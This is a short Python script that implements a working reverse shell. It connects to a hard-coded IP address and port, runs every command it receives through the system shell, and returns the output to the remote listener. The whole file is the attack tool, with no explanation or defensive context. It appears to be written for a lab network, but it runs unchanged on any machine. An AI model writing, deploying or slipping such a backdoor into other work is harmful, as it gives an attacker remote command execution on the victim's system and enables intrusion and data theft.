#!/bin/python3

import socket
import subprocess

remote_host = "192.168.43.101"
remote_port = 4343

client = socket.socket()
print("[-] initializing connection....")
client.connect((remote_host, remote_port))
print("[-] connection initialized...")

while True:
    print("[-] awaiting commands")
    command = client.recv(1024)
    command = command.decode()
    op = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, output_error = op.communicate()
    
    print("[-] send response....")
    client.send(output + output_error)

client.close()
